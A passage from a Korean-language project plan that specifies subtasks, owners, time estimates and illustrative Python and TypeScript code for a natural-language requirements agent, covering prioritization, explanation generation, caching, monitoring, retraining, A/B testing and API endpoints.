          `Response time < 200ms at p95`,
          `Error rate < 0.1%`,
          `Availability > 99.9%`,
        ],
      });
    }

    // 확장성 목표
    if (/scalab|elastic|auto.?scal/i.test(description)) {
      technicalGoals.push({
        type: "scalability",
        specification: "Auto-scaling capability",
        targetState: "Horizontal scaling with automatic adjustment",
        acceptanceCriteria: [
          "Scale from 1 to N instances based on load",
          "Scale up time < 2 minutes",
          "Zero downtime during scaling",
        ],
      });
    }

    // 보안 목표
    const securityKeywords = [
      "secure",
      "encrypt",
      "auth",
      "compliance",
      "gdpr",
      "hipaa",
    ];
    const hasSecurityRequirement = securityKeywords.some((keyword) =>
      description.toLowerCase().includes(keyword)
    );

    if (hasSecurityRequirement) {
      technicalGoals.push({
        type: "security",
        specification: "Enterprise-grade security",
        targetState: "Fully secured application",
        acceptanceCriteria: [
          "End-to-end encryption",
          "Multi-factor authentication",
          "Role-based access control",
          "Security audit compliance",
        ],
      });
    }

    return technicalGoals;
  }
}
```

**검증 기준**:

- [ ] 의도 분류 정확도 85% 이상
- [ ] 비즈니스 목표 추출 완성도
- [ ] 기술 목표 구체화
- [ ] 측정 가능한 성과 지표 도출

#### SubTask 4.3.3: 요구사항 우선순위 자동화

**담당자**: 프로덕트 매니저  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/nl_priority_analyzer.py
from typing import List, Dict, Tuple
from dataclasses import dataclass
import numpy as np

@dataclass
class PrioritizedRequirement:
    requirement: ParsedRequirement
    priority_score: float
    priority_factors: Dict[str, float]
    dependencies: List[str]
    estimated_effort: int  # story points
    business_value: float
    risk_level: float
    recommended_sprint: int

class RequirementPrioritizer:
    """요구사항 우선순위 자동 결정"""

    def __init__(self):
        self.value_estimator = BusinessValueEstimator()
        self.effort_estimator = EffortEstimator()
        self.risk_analyzer = RiskAnalyzer()
        self.dependency_resolver = DependencyResolver()

    async def prioritize_requirements(
        self,
        requirements: List[ParsedRequirement],
        project_context: ProjectContext
    ) -> List[PrioritizedRequirement]:
        """요구사항 우선순위 결정"""

        prioritized = []

        # 1. 각 요구사항 평가
        for req in requirements:
            # 비즈니스 가치 평가
            business_value = await self.value_estimator.estimate(req, project_context)

            # 구현 노력 추정
            effort = await self.effort_estimator.estimate(req)

            # 리스크 평가
            risk = await self.risk_analyzer.analyze(req)

            # 의존성 분석
            dependencies = self.dependency_resolver.find_dependencies(req, requirements)

            # 우선순위 점수 계산
            priority_score = self._calculate_priority_score(
                business_value,
                effort,
                risk,
                len(dependencies)
            )

            prioritized.append(PrioritizedRequirement(
                requirement=req,
                priority_score=priority_score,
                priority_factors={
                    'business_value': business_value,
                    'effort': effort,
                    'risk': risk,
                    'dependency_count': len(dependencies)
                },
                dependencies=dependencies,
                estimated_effort=effort,
                business_value=business_value,
                risk_level=risk,
                recommended_sprint=0  # 나중에 계산
            ))

        # 2. 의존성 기반 정렬
        prioritized = self._sort_by_dependencies(prioritized)

        # 3. 스프린트 할당
        prioritized = self._assign_to_sprints(prioritized, project_context)

        return prioritized

    def _calculate_priority_score(
        self,
        business_value: float,
        effort: int,
        risk: float,
        dependency_count: int
    ) -> float:
        """우선순위 점수 계산 (WSJF 변형)"""

        # Weighted Shortest Job First (WSJF) 공식 변형
        # Score = (Business Value + Time Criticality + Risk Reduction) / Job Size

        time_criticality = 1.0 / (dependency_count + 1)  # 의존성이 적을수록 높음
        risk_reduction = 1.0 - risk  # 리스크가 높은 항목 우선 처리

        numerator = (
            business_value * 0.4 +
            time_criticality * 0.3 +
            risk_reduction * 0.3
        )

        # 작업 크기로 나누기 (0으로 나누기 방지)
        job_size = max(effort, 1)

        return numerator / job_size

    def _sort_by_dependencies(
        self,
        prioritized: List[PrioritizedRequirement]
    ) -> List[PrioritizedRequirement]:
        """의존성을 고려한 정렬"""

        # 의존성 그래프 생성
        dependency_graph = {}
        for p_req in prioritized:
            dependency_graph[p_req.requirement.id] = p_req.dependencies

        # 위상 정렬
        sorted_ids = self._topological_sort(dependency_graph)

        # 정렬된 순서로 재배열
        id_to_req = {p.requirement.id: p for p in prioritized}
        sorted_requirements = []

        for req_id in sorted_ids:
            if req_id in id_to_req:
                sorted_requirements.append(id_to_req[req_id])

        # 위상 정렬에 포함되지 않은 요구사항 추가
        for p_req in prioritized:
            if p_req not in sorted_requirements:
                sorted_requirements.append(p_req)

        return sorted_requirements

    def _assign_to_sprints(
        self,
        prioritized: List[PrioritizedRequirement],
        project_context: ProjectContext
    ) -> List[PrioritizedRequirement]:
        """스프린트 할당"""

        sprint_capacity = project_context.team_velocity or 20  # 기본값
        current_sprint = 1
        current_capacity = 0

        for p_req in prioritized:
            # 현재 스프린트 용량 확인
            if current_capacity + p_req.estimated_effort > sprint_capacity:
                current_sprint += 1
                current_capacity = 0

            p_req.recommended_sprint = current_sprint
            current_capacity += p_req.estimated_effort

        return prioritized

    def _topological_sort(self, graph: Dict[str, List[str]]) -> List[str]:
        """위상 정렬 구현"""

        # 진입 차수 계산
        in_degree = {node: 0 for node in graph}
        for node in graph:
            for dep in graph[node]:
                if dep in in_degree:
                    in_degree[dep] += 1

        # 진입 차수가 0인 노드로 시작
        queue = [node for node, degree in in_degree.items() if degree == 0]
        sorted_nodes = []

        while queue:
            node = queue.pop(0)
            sorted_nodes.append(node)

            # 연결된 노드의 진입 차수 감소
            for dep in graph.get(node, []):
                if dep in in_degree:
                    in_degree[dep] -= 1
                    if in_degree[dep] == 0:
                        queue.append(dep)

        return sorted_nodes
```

**검증 기준**:

- [ ] WSJF 기반 우선순위 계산
- [ ] 의존성 고려 정렬
- [ ] 스프린트 자동 할당
- [ ] 팀 속도 반영

#### SubTask 4.3.4: 자연어 생성 및 설명

**담당자**: 테크니컬 라이터  
**예상 소요시간**: 8시간

**작업 내용**:

```python
# backend/src/agents/implementations/nl_explanation_generator.py
from typing import Dict, List, Any
from agno.agent import Agent
from agno.models.aws import AwsBedrock

class NLExplanationGenerator:
    """분석 결과를 자연어로 설명하는 생성기"""

    def __init__(self):
        self.explanation_agent = Agent(
            name="Explanation-Generator",
            model=AwsBedrock(id="anthropic.claude-3-haiku-v1:0"),
            role="Technical writer specializing in clear explanations",
            instructions=[
                "복잡한 기술 개념을 쉽게 설명",
                "분석 결과를 구조화된 형태로 제시",
                "사용자 수준에 맞는 설명 제공",
                "핵심 포인트 강조"
            ],
            temperature=0.7
        )

        self.template_engine = ExplanationTemplateEngine()
        self.formatter = ResponseFormatter()

    async def generate_requirements_summary(
        self,
        requirements: ProjectRequirements,
        analysis_results: Dict[str, Any]
    ) -> str:
        """요구사항 분석 결과 요약"""

        summary_prompt = f"""
        다음 프로젝트 분석 결과를 사용자가 이해하기 쉽게 요약해주세요:

        프로젝트 유형: {requirements.project_type}
        주요 기능: {', '.join(requirements.technical_requirements[:5])}
        기술 스택: {requirements.technology_preferences}
        제약사항: {', '.join(requirements.constraints)}

        다음 형식으로 작성하세요:
        1. 프로젝트 개요 (2-3문장)
        2. 핵심 기능 요약
        3. 기술적 접근 방법
        4. 주의사항 및 제약
        5. 다음 단계 제안
        """

        summary = await self.explanation_agent.arun(summary_prompt)

        # 포맷팅 및 스타일 적용
        formatted_summary = self.formatter.format_summary(summary)

        return formatted_summary

    async def explain_technical_decisions(
        self,
        decisions: List[Dict[str, Any]],
        user_level: str = 'intermediate'
    ) -> Dict[str, str]:
        """기술적 결정사항 설명"""

        explanations = {}

        for decision in decisions:
            # 사용자 수준에 맞는 설명 생성
            if user_level == 'beginner':
                explanation = await self._generate_beginner_explanation(decision)
            elif user_level == 'advanced':
                explanation = await self._generate_advanced_explanation(decision)
            else:
                explanation = await self._generate_intermediate_explanation(decision)

            explanations[decision['id']] = explanation

        return explanations

    async def _generate_beginner_explanation(
        self,
        decision: Dict[str, Any]
    ) -> str:
        """초급자를 위한 설명"""

        template = """
        🎯 **{decision_name}**

        **무엇인가요?**
        {simple_description}

        **왜 선택했나요?**
        {reasons_simple}

        **어떤 장점이 있나요?**
        {benefits_list}

        **참고사항**
        {considerations}
        """

        explanation_data = {
            'decision_name': decision['name'],
            'simple_description': await self._simplify_description(decision['description']),
            'reasons_simple': await self._simplify_reasons(decision['reasons']),
            'benefits_list': self._format_benefits(decision['benefits']),
            'considerations': self._format_considerations(decision['considerations'])
        }

        return self.template_engine.render(template, explanation_data)

    async def generate_clarification_response(
        self,
        question: ClarificationQuestion,
        user_answer: str,
        impact_analysis: Dict[str, Any]
    ) -> str:
        """명확화 질문에 대한 응답 생성"""

        response_prompt = f"""
        사용자가 다음 명확화 질문에 답변했습니다:

        질문: {question.question}
        답변: {user_answer}

        이 답변이 프로젝트에 미치는 영향:
        {impact_analysis}

        사용자에게 다음을 포함한 응답을 작성하세요:
        1. 답변 확인 및 감사
        2. 답변이 프로젝트에 미치는 영향 설명
        3. 추가로 필요한 정보나 다음 단계
        """

        response = await self.explanation_agent.arun(response_prompt)

        return self.formatter.format_clarification_response(response)

    def _format_benefits(self, benefits: List[str]) -> str:
        """장점 목록 포맷팅"""

        if not benefits:
            return "- 표준적이고 안정적인 선택입니다"

        formatted = []
        for benefit in benefits[:3]:  # 최대 3개
            formatted.append(f"- ✅ {benefit}")

        return "\n".join(formatted)

    def _format_considerations(self, considerations: List[str]) -> str:
        """고려사항 포맷팅"""

        if not considerations:
            return "특별한 주의사항은 없습니다."

        formatted = []
        for consideration in considerations[:2]:  # 최대 2개
            formatted.append(f"- ⚠️ {consideration}")

        return "\n".join(formatted)
```

**검증 기준**:

- [ ] 사용자 수준별 설명 생성
- [ ] 기술 용어 자동 설명
- [ ] 시각적 포맷팅 지원
- [ ] 다국어 설명 생성 가능

---

### Task 4.4: NL 에이전트 최적화 및 모니터링

#### SubTask 4.4.1: 성능 최적화 시스템

**담당자**: 성능 엔지니어  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/nl_performance_optimizer.py
from typing import Dict, List, Optional
import asyncio
from functools import lru_cache
import redis
from dataclasses import dataclass

@dataclass
class PerformanceMetrics:
    response_time: float
    token_usage: int
    cache_hit_rate: float
    error_rate: float
    throughput: float

class NLPerformanceOptimizer:
    """NL Agent 성능 최적화"""

    def __init__(self):
        self.cache = redis.Redis(
            host='localhost',
            port=6379,
            decode_responses=True
        )
        self.metrics_collector = MetricsCollector()
        self.query_optimizer = QueryOptimizer()
        self.batch_processor = BatchProcessor()

    async def optimize_processing(
        self,
        nl_agent: NLInputAgent,
        input_text: str,
        optimization_level: str = 'balanced'
    ) -> ProjectRequirements:
        """최적화된 요구사항 처리"""

        # 1. 캐시 확인
        cache_key = self._generate_cache_key(input_text)
        cached_result = await self._check_cache(cache_key)

        if cached_result:
            self.metrics_collector.record_cache_hit()
            return cached_result

        # 2. 입력 최적화
        if optimization_level in ['aggressive', 'balanced']:
            optimized_input = await self.query_optimizer.optimize(input_text)
        else:
            optimized_input = input_text

        # 3. 처리 전략 결정
        processing_strategy = self._determine_strategy(
            optimized_input,
            optimization_level
        )

        # 4. 최적화된 처리 실행
        start_time = asyncio.get_event_loop().time()

        if processing_strategy == 'batch':
            result = await self._batch_process(nl_agent, optimized_input)
        elif processing_strategy == 'stream':
            result = await self._stream_process(nl_agent, optimized_input)
        else:
            result = await nl_agent.process_description(optimized_input)

        # 5. 결과 캐싱
        await self._cache_result(cache_key, result)

        # 6. 메트릭 수집
        processing_time = asyncio.get_event_loop().time() - start_time
        self.metrics_collector.record_processing(
            processing_time,
            len(input_text),
            processing_strategy
        )

        return result

    def _generate_cache_key(self, input_text: str) -> str:
        """캐시 키 생성"""

        # 정규화
        normalized = input_text.lower().strip()

        # 해시 생성
        import hashlib
        hash_object = hashlib.sha256(normalized.encode())
        return f"nl_input:{hash_object.hexdigest()[:16]}"

    async def _check_cache(self, cache_key: str) -> Optional[ProjectRequirements]:
        """캐시 확인"""

        try:
            cached_data = self.cache.get(cache_key)
            if cached_data:
                import json
                data = json.loads(cached_data)
                return ProjectRequirements(**data)
        except Exception as e:
            # 캐시 오류는 무시하고 진행
            pass

        return None

    async def _batch_process(
        self,
        nl_agent: NLInputAgent,
        input_text: str
    ) -> ProjectRequirements:
        """배치 처리 전략"""

        # 입력을 청크로 분할
        chunks = self._split_into_chunks(input_text)

        # 병렬 처리
        tasks = []
        for chunk in chunks:
            task = nl_agent.process_description(chunk)
            tasks.append(task)

        results = await asyncio.gather(*tasks)

        # 결과 병합
        merged_result = self._merge_results(results)

        return merged_result

    @lru_cache(maxsize=1000)
    def _determine_strategy(
        self,
        input_text: str,
        optimization_level: str
    ) -> str:
        """처리 전략 결정"""

        text_length = len(input_text)

        if optimization_level == 'aggressive':
            if text_length > 5000:
                return 'batch'
            elif text_length > 2000:
                return 'stream'
        elif optimization_level == 'balanced':
            if text_length > 10000:
                return 'batch'

        return 'standard'

    async def get_performance_metrics(self) -> PerformanceMetrics:
        """성능 메트릭 조회"""

        metrics = await self.metrics_collector.get_current_metrics()

        return PerformanceMetrics(
            response_time=metrics['avg_response_time'],
            token_usage=metrics['total_tokens'],
            cache_hit_rate=metrics['cache_hit_rate'],
            error_rate=metrics['error_rate'],
            throughput=metrics['requests_per_minute']
        )
```

**검증 기준**:

- [ ] 응답 시간 50% 개선
- [ ] 캐시 적중률 80% 이상
- [ ] 토큰 사용량 최적화
- [ ] 병렬 처리 지원

#### SubTask 4.4.2: 실시간 모니터링 대시보드

**담당자**: 데이터 엔지니어  
**예상 소요시간**: 10시간

**작업 내용**:

```typescript
// backend/src/agents/implementations/nl-monitoring-dashboard.ts
interface NLAgentMetrics {
  timestamp: Date;
  requestCount: number;
  averageResponseTime: number;
  tokenUsage: {
    input: number;
    output: number;
    total: number;
  };
  errorRate: number;
  userSatisfaction: number;
  topIntents: IntentCount[];
  languageDistribution: LanguageCount[];
}

interface AlertRule {
  id: string;
  metric: string;
  condition: "gt" | "lt" | "eq";
  threshold: number;
  severity: "low" | "medium" | "high" | "critical";
  action: AlertAction;
}

class NLMonitoringDashboard {
  private metricsStore: MetricsStore;
  private alertManager: AlertManager;
  private visualizer: DataVisualizer;

  constructor() {
    this.metricsStore = new MetricsStore();
    this.alertManager = new AlertManager();
    this.visualizer = new DataVisualizer();

    this.initializeAlertRules();
  }

  private initializeAlertRules(): void {
    const rules: AlertRule[] = [
      {
        id: "high_response_time",
        metric: "averageResponseTime",
        condition: "gt",
        threshold: 3000, // 3초
        severity: "high",
        action: {
          type: "notification",
          channels: ["slack", "email"],
        },
      },
      {
        id: "high_error_rate",
        metric: "errorRate",
        condition: "gt",
        threshold: 0.05, // 5%
        severity: "critical",
        action: {
          type: "escalation",
          channels: ["pagerduty"],
        },
      },
      {
        id: "token_usage_spike",
        metric: "tokenUsage.total",
        condition: "gt",
        threshold: 100000, // 일일 한도
        severity: "medium",
        action: {
          type: "throttle",
          channels: ["api_gateway"],
        },
      },
    ];

    rules.forEach((rule) => this.alertManager.addRule(rule));
  }

  async collectMetrics(): Promise<void> {
    const metrics = await this.gatherCurrentMetrics();

    // 메트릭 저장
    await this.metricsStore.save(metrics);

    // 알림 확인
    await this.alertManager.evaluate(metrics);

    // 실시간 업데이트
    await this.broadcastMetrics(metrics);
  }

  private async gatherCurrentMetrics(): Promise<NLAgentMetrics> {
    const now = new Date();
    const fiveMinutesAgo = new Date(now.getTime() - 5 * 60 * 1000);

    // 각종 메트릭 수집
    const [
      requestCount,
      responseTimes,
      tokenUsage,
      errors,
      satisfaction,
      intents,
      languages,
    ] = await Promise.all([
      this.countRequests(fiveMinutesAgo, now),
      this.getResponseTimes(fiveMinutesAgo, now),
      this.getTokenUsage(fiveMinutesAgo, now),
      this.getErrors(fiveMinutesAgo, now),
      this.getUserSatisfaction(fiveMinutesAgo, now),
      this.getTopIntents(fiveMinutesAgo, now),
      this.getLanguageDistribution(fiveMinutesAgo, now),
    ]);

    return {
      timestamp: now,
      requestCount,
      averageResponseTime: this.calculateAverage(responseTimes),
      tokenUsage,
      errorRate: errors.length / requestCount,
      userSatisfaction: satisfaction,
      topIntents: intents,
      languageDistribution: languages,
    };
  }

  async generateDashboard(): Promise<DashboardConfig> {
    const hourlyMetrics = await this.metricsStore.getHourlyMetrics();
    const dailyMetrics = await this.metricsStore.getDailyMetrics();

    return {
      widgets: [
        {
          type: "line-chart",
          title: "Response Time Trend",
          data: this.visualizer.prepareTimeSeriesData(
            hourlyMetrics,
            "averageResponseTime"
          ),
          config: {
            yAxis: { label: "Time (ms)" },
            threshold: 2000,
          },
        },
        {
          type: "gauge",
          title: "Current Token Usage",
          data: this.visualizer.prepareGaugeData(
            dailyMetrics.tokenUsage.total,
            100000 // daily limit
          ),
          config: {
            zones: [
              { max: 50000, color: "green" },
              { max: 80000, color: "yellow" },
              { max: 100000, color: "red" },
            ],
          },
        },
        {
          type: "bar-chart",
          title: "Top User Intents",
          data: this.visualizer.prepareBarChartData(dailyMetrics.topIntents),
          config: {
            orientation: "horizontal",
            limit: 10,
          },
        },
        {
          type: "heatmap",
          title: "Request Distribution",
          data: this.visualizer.prepareHeatmapData(
            hourlyMetrics,
            "requestCount"
          ),
          config: {
            xAxis: "hour",
            yAxis: "dayOfWeek",
          },
        },
      ],
      alerts: await this.alertManager.getActiveAlerts(),
      summary: this.generateSummaryStats(dailyMetrics),
    };
  }
}
```

**검증 기준**:

- [ ] 실시간 메트릭 수집 (5분 간격)
- [ ] 시각화 위젯 4종 이상
- [ ] 알림 규칙 자동 평가
- [ ] 성능 이상 자동 감지

#### SubTask 4.4.3: 학습 데이터 수집 및 개선

**담당자**: ML 엔지니어  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/nl_learning_system.py
from typing import List, Dict, Tuple
import pandas as pd
from sklearn.model_selection import train_test_split

@dataclass
class TrainingExample:
    input_text: str
    expected_output: ProjectRequirements
    actual_output: Optional[ProjectRequirements]
    user_feedback: Optional[UserFeedback]
    processing_time: float
    success: bool

class NLLearningSystem:
    """NL Agent 지속적 학습 시스템"""

    def __init__(self):
        self.training_data_store = TrainingDataStore()
        self.model_trainer = ModelTrainer()
        self.evaluation_engine = EvaluationEngine()
        self.feedback_processor = FeedbackProcessor()

    async def collect_training_example(
        self,
        input_text: str,
        output: ProjectRequirements,
        metadata: Dict[str, Any]
    ):
        """학습 데이터 수집"""

        example = TrainingExample(
            input_text=input_text,
            expected_output=None,  # 나중에 사용자 피드백으로 채움
            actual_output=output,
            user_feedback=None,
            processing_time=metadata.get('processing_time', 0),
            success=metadata.get('success', True)
        )

        # 저장
        await self.training_data_store.save(example)

        # 이상 감지
        if await self._is_anomaly(example):
            await self._handle_anomaly(example)

    async def process_user_feedback(
        self,
        example_id: str,
        feedback: UserFeedback
    ):
        """사용자 피드백 처리"""

        # 학습 예제 업데이트
        example = await self.training_data_store.get(example_id)
        example.user_feedback = feedback

        # 피드백 기반 개선점 분석
        improvements = await self.feedback_processor.analyze(
            example,
            feedback
        )

        # 개선사항 적용
        if improvements:
            await self._apply_improvements(improvements)

        # 재학습 필요성 평가
        if await self._should_retrain():
            await self._trigger_retraining()

    async def evaluate_performance(
        self,
        time_period: str = 'daily'
    ) -> PerformanceReport:
        """성능 평가"""

        # 데이터 로드
        examples = await self.training_data_store.get_examples(time_period)

        # 메트릭 계산
        metrics = {
            'accuracy': self._calculate_accuracy(examples),
            'precision': self._calculate_precision(examples),
            'recall': self._calculate_recall(examples),
            'f1_score': self._calculate_f1_score(examples),
            'user_satisfaction': self._calculate_satisfaction(examples)
        }

        # 트렌드 분석
        trends = await self._analyze_trends(examples)

        # 개선 제안
        recommendations = await self._generate_recommendations(
            metrics,
            trends
        )

        return PerformanceReport(
            metrics=metrics,
            trends=trends,
            recommendations=recommendations,
            sample_size=len(examples)
        )

    async def _should_retrain(self) -> bool:
        """재학습 필요성 판단"""

        # 최근 성능 메트릭
        recent_performance = await self.evaluate_performance('weekly')

        # 재학습 기준
        criteria = {
            'accuracy_drop': recent_performance.metrics['accuracy'] < 0.85,
            'high_error_rate': recent_performance.metrics['error_rate'] > 0.1,
            'user_complaints': recent_performance.metrics['user_satisfaction'] < 0.7,
            'data_drift': await self._detect_data_drift()
        }

        # 하나라도 충족하면 재학습
        return any(criteria.values())

    async def _trigger_retraining(self):
        """모델 재학습 트리거"""

        # 학습 데이터 준비
        training_data = await self._prepare_training_data()

        # 검증 세트 분리
        train_set, val_set = train_test_split(
            training_data,
            test_size=0.2,
            random_state=42
        )

        # 모델 학습
        new_model = await self.model_trainer.train(
            train_set,
            val_set,
            hyperparameters={
                'learning_rate': 0.001,
                'batch_size': 32,
                'epochs': 10
            }
        )

        # 성능 비교
        current_performance = await self._evaluate_current_model(val_set)
        new_performance = await self._evaluate_model(new_model, val_set)

        # 개선된 경우에만 배포
        if new_performance > current_performance * 1.05:  # 5% 개선
            await self._deploy_new_model(new_model)

    async def _prepare_training_data(self) -> pd.DataFrame:
        """학습 데이터 준비"""

        # 최근 3개월 데이터
        examples = await self.training_data_store.get_examples('3months')

        # 성공적인 예제만 선택
        successful_examples = [
            ex for ex in examples
            if ex.success and ex.user_feedback and ex.user_feedback.rating >= 4
        ]

        # 데이터 증강
        augmented_data = await self._augment_data(successful_examples)

        # 데이터프레임 변환
        df = pd.DataFrame([
            {
                'input': ex.input_text,
                'output': ex.expected_output or ex.actual_output,
                'features': self._extract_features(ex)
            }
            for ex in augmented_data
        ])

        return df
```

**검증 기준**:

- [ ] 자동 학습 데이터 수집
- [ ] 사용자 피드백 통합
- [ ] 성능 저하 자동 감지
- [ ] 모델 재학습 자동화

#### SubTask 4.4.4: A/B 테스팅 프레임워크

**담당자**: 실험 엔지니어  
**예상 소요시간**: 10시간

**작업 내용**:

```typescript
// backend/src/agents/implementations/nl-ab-testing.ts
interface Experiment {
  id: string;
  name: string;
  hypothesis: string;
  variants: Variant[];
  allocation: AllocationStrategy;
  metrics: MetricDefinition[];
  status: "draft" | "running" | "completed" | "aborted";
  results?: ExperimentResults;
}

interface Variant {
  id: string;
  name: string;
  description: string;
  configuration: any;
  allocation: number; // percentage
}

interface ExperimentResults {
  winner?: string;
  confidence: number;
  metrics: {
    [variantId: string]: {
      [metricName: string]: MetricResult;
    };
  };
  sampleSize: {
    [variantId: string]: number;
  };
}

class NLABTestingFramework {
  private experiments: Map<string, Experiment> = new Map();
  private assignmentService: AssignmentService;
  private metricsCollector: MetricsCollector;
  private statisticsEngine: StatisticsEngine;

  async createExperiment(config: ExperimentConfig): Promise<Experiment> {
    const experiment: Experiment = {
      id: generateId(),
      name: config.name,
      hypothesis: config.hypothesis,
      variants: config.variants,
      allocation: config.allocation || { type: "even" },
      metrics: config.metrics,
      status: "draft",
    };

    // 실험 검증
    await this.validateExperiment(experiment);

    // 저장
    this.experiments.set(experiment.id, experiment);

    return experiment;
  }

  async startExperiment(experimentId: string): Promise<void> {
    const experiment = this.experiments.get(experimentId);
    if (!experiment) throw new Error("Experiment not found");

    // 사전 검증
    await this.preflightCheck(experiment);

    // 실험 시작
    experiment.status = "running";

    // 할당 서비스 초기화
    await this.assignmentService.initialize(experiment);

    // 메트릭 수집 시작
    await this.metricsCollector.startCollection(experiment);
  }

  async assignVariant(experimentId: string, userId: string): Promise<Variant> {
    const experiment = this.experiments.get(experimentId);
    if (!experiment || experiment.status !== "running") {
      throw new Error("No active experiment");
    }

    // 사용자 할당 (일관성 보장)
    const variant = await this.assignmentService.assign(experiment, userId);

    // 할당 기록
    await this.recordAssignment(experimentId, userId, variant.id);

    return variant;
  }

  async processWithVariant(
    nlAgent: NLInputAgent,
    input: string,
    userId: string
  ): Promise<ProjectRequirements> {
    // 활성 실험 확인
    const activeExperiments = this.getActiveExperiments();

    let selectedVariant = null;
    let experimentId = null;

    // 사용자에게 할당된 변형 찾기
    for (const experiment of activeExperiments) {
      const variant = await this.assignVariant(experiment.id, userId);
      if (variant) {
        selectedVariant = variant;
        experimentId = experiment.id;
        break;
      }
    }

    // 변형 적용
    const modifiedAgent = selectedVariant
      ? this.applyVariant(nlAgent, selectedVariant)
      : nlAgent;

    // 처리 시작
    const startTime = Date.now();
    const result = await modifiedAgent.process_description(input);
    const duration = Date.now() - startTime;

    // 메트릭 기록
    if (experimentId && selectedVariant) {
      await this.recordMetrics(experimentId, selectedVariant.id, {
        processingTime: duration,
        success: true,
        timestamp: new Date(),
      });
    }

    return result;
  }

  async analyzeExperiment(experimentId: string): Promise<ExperimentResults> {
    const experiment = this.experiments.get(experimentId);
    if (!experiment) throw new Error("Experiment not found");

    // 데이터 수집
    const data = await this.metricsCollector.getData(experimentId);

    // 통계 분석
    const analysis = await this.statisticsEngine.analyze(data, {
      confidenceLevel: 0.95,
      minimumSampleSize: 100,
      testType: "two-tailed",
    });

    // 결과 구성
    const results: ExperimentResults = {
      confidence: analysis.confidence,
      metrics: {},
      sampleSize: {},
    };

    // 각 변형별 메트릭 계산
    for (const variant of experiment.variants) {
      results.metrics[variant.id] = {};
      results.sampleSize[variant.id] = data[variant.id].length;

      for (const metric of experiment.metrics) {
        results.metrics[variant.id][metric.name] = await this.calculateMetric(
          data[variant.id],
          metric
        );
      }
    }

    // 승자 결정
    if (analysis.isSignificant) {
      results.winner = analysis.winner;
    }

    return results;
  }

  private applyVariant(agent: NLInputAgent, variant: Variant): NLInputAgent {
    // 변형 설정 적용
    const modifiedAgent = Object.create(agent);

    if (variant.configuration.temperature !== undefined) {
      modifiedAgent.temperature = variant.configuration.temperature;
    }

    if (variant.configuration.model !== undefined) {
      modifiedAgent.model = variant.configuration.model;
    }

    if (variant.configuration.prompts !== undefined) {
      modifiedAgent.prompts = {
        ...modifiedAgent.prompts,
        ...variant.configuration.prompts,
      };
    }

    return modifiedAgent;
  }
}
```

**검증 기준**:

- [ ] 실험 생성 및 관리
- [ ] 사용자별 일관된 변형 할당
- [ ] 실시간 메트릭 수집
- [ ] 통계적 유의성 검증

---

# Phase 4: 9개 핵심 에이전트 구현 - Part 3 (Tasks 4.5-4.6)

## 1. NL Input Agent (자연어 입력 에이전트) - 계속

### Task 4.5: NL Agent 통합 및 인터페이스

#### SubTask 4.5.1: RESTful API 엔드포인트 구현

**담당자**: API 개발자  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/api/endpoints/nl_input_endpoints.py
from fastapi import APIRouter, HTTPException, BackgroundTasks, UploadFile, File
from typing import List, Optional, Dict
from pydantic import BaseModel, Field
import asyncio

router = APIRouter(prefix="/api/v1/nl-input", tags=["nl-input"])

class NLInputRequest(BaseModel):
    description: str = Field(..., min_length=10, max_length=5000)
    session_id: Optional[str] = None
    user_id: str
    context: Optional[Dict[str, Any]] = None
    language: Optional[str] = "en"
    clarifications: Optional[Dict[str, str]] = None

class NLInputResponse(BaseModel):
    project_id: str
    status: str
    requirements: ProjectRequirements
    clarification_needed: bool
    clarification_questions: Optional[List[ClarificationQuestion]] = None
    processing_time: float
    confidence_score: float

class ClarificationResponse(BaseModel):
    session_id: str
    answers: Dict[str, Any]

@router.post("/analyze", response_model=NLInputResponse)
async def analyze_project_description(
    request: NLInputRequest,
    background_tasks: BackgroundTasks
):
    """프로젝트 설명 분석 엔드포인트"""

    start_time = asyncio.get_event_loop().time()

    try:
        # NL Agent 인스턴스 가져오기
        nl_agent = get_nl_agent_instance()

        # 세션 관리
        session_id = request.session_id or generate_session_id()
        context = await get_or_create_context(session_id, request.user_id)

        # 언어 감지 및 처리
        if request.language != "en":
            processed_input = await process_multilingual_input(
                request.description,
                request.language
            )
        else:
            processed_input = request.description

        # 요구사항 분석
        requirements = await nl_agent.process_description(
            processed_input,
            context=request.context
        )

        # 명확화 필요 여부 확인
        ambiguities = await identify_ambiguities(requirements)
        clarification_questions = []

        if ambiguities:
            clarification_questions = await generate_clarification_questions(
                ambiguities,
                context
            )

        # 프로젝트 레코드 생성
        project_id = await create_project_record(
            user_id=request.user_id,
            requirements=requirements,
            session_id=session_id
        )

        # 백그라운드 작업: 분석 결과 저장
        background_tasks.add_task(
            save_analysis_results,
            project_id,
            requirements,
            session_id
        )

        processing_time = asyncio.get_event_loop().time() - start_time

        return NLInputResponse(
            project_id=project_id,
            status="analysis_complete",
            requirements=requirements,
            clarification_needed=len(clarification_questions) > 0,
            clarification_questions=clarification_questions,
            processing_time=processing_time,
            confidence_score=calculate_confidence_score(requirements)
        )

    except Exception as e:
        logger.error(f"Error analyzing project description: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/clarify/{session_id}")
async def process_clarification(
    session_id: str,
    response: ClarificationResponse
):
    """명확화 응답 처리"""

    try:
        # 세션 컨텍스트 로드
        context = await get_session_context(session_id)
        if not context:
            raise HTTPException(status_code=404, detail="Session not found")

        # NL Agent 인스턴스
        nl_agent = get_nl_agent_instance()

        # 명확화 응답 처리
        updated_requirements = await nl_agent.process_clarifications(
            context.requirements,
            response.answers
        )

        # 업데이트된 요구사항 저장
        await update_project_requirements(
            context.project_id,
            updated_requirements
        )

        # 추가 명확화 필요 여부 확인
        remaining_ambiguities = await identify_ambiguities(updated_requirements)

        return {
            "status": "clarification_processed",
            "updated_requirements": updated_requirements,
            "further_clarification_needed": len(remaining_ambiguities) > 0,
            "remaining_questions": remaining_ambiguities
        }

    except Exception as e:
        logger.error(f"Error processing clarification: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/multimodal")
async def analyze_multimodal_input(
    description: Optional[str] = None,
    files: List[UploadFile] = File(None),
    user_id: str = Form(...),
    language: str = Form("en")
):
    """멀티모달 입력 분석 (텍스트 + 이미지/문서)"""

    try:
        # 멀티모달 프로세서 인스턴스
        multimodal_processor = get_multimodal_processor()

        # 입력 수집
        inputs = []
        if description:
            inputs.append(description)

        if files:
            for file in files:
                content = await file.read()
                inputs.append({
                    'type': file.content_type,
                    'filename': file.filename,
                    'content': content
                })

        if not inputs:
